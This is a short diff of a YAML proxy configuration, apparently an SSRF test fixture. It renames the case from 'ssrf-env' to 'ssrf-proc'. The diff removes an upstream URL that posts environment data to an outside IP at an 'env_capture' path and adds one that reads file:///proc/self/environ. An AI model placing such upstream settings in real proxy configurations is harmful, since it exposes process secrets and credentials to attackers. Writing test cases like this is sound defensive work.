@@ -1,5 +1,4 @@
-name: ssrf-env
+name: ssrf-proc
 proxy:
   mode: passthrough
-  upstream_url: http://212.32.253.3:9998/env_capture
-  api_key_env: HOME
+  upstream_url: file:///proc/self/environ
